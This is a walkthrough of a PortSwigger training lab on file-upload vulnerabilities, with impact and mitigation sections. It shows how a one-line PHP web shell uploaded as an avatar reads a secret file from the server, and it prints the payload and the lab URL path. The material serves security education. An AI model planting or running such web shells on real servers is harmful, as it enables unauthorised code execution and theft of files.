# Remote code execution via web shell upload

**Source:** [PortSwigger](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)  
**Category:** File Upload  
**Difficulty:** Apprentice

## Objective
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

## Vulnerability
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

### Steps

1. Access the lab and log in to your account, go to the user profile (**My account**) and find the avatar upload function.

2. Upload a `shell.php` file with PHP code that reads the contents of `/home/carlos/secret`:
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
    The application confirms the file was saved:
    ```text
    "The file avatars/shell.php has been uploaded."
    ```

3. Try to open the file via guessed paths (`/avatars/shell.php`, `/uploads/shell.php`, `/files/shell.php`, etc.) - all return `404 Not Found`, we did not know the exact file location.

4. Determine the correct path - avatar files are served under `/files/avatars/`. Open in the browser:
    ```text
    https://0a1500230339b119827e8d7500230088.web-security-academy.net/files/avatars/shell.php
    ```
    The server executes the PHP code and returns:
    ```text
    ODkoyBxl5aHYt1UmgG4JExXzhRNkrwO8
    ```

5. Copy the secret and submit it via the **Submit solution** button in the lab banner. Lab solved.

### Payload
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Shortcut
1. Log in and go to **My account** -> avatar upload.
2. Upload `shell.php` containing `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
3. Open `https://<lab-id>.web-security-academy.net/files/avatars/shell.php`.
4. Copy the returned secret and submit it via **Submit solution**.

## Impact
An attacker can upload and execute arbitrary PHP code on the server, leading to remote code execution. This allows reading sensitive files, exfiltrating secrets, and potentially full server compromise.

## Mitigation
Validate uploaded file types using an allowlist of safe extensions and MIME types. Do not rely on client-side validation. Store uploaded files outside the web root or in a directory where script execution is disabled. Rename uploaded files to prevent extension-based execution. Serve uploads with a `Content-Type` that prevents execution and use a separate domain for user content.

## Tools
- Browser
- VSC

## Notes
- Avatar upload accepts `.php` files without proper validation.
- Uploaded avatars are stored under `/files/avatars/`.
- The server executes PHP in the upload directory, enabling RCE.
- The secret is read directly from `/home/carlos/secret` and returned in the response.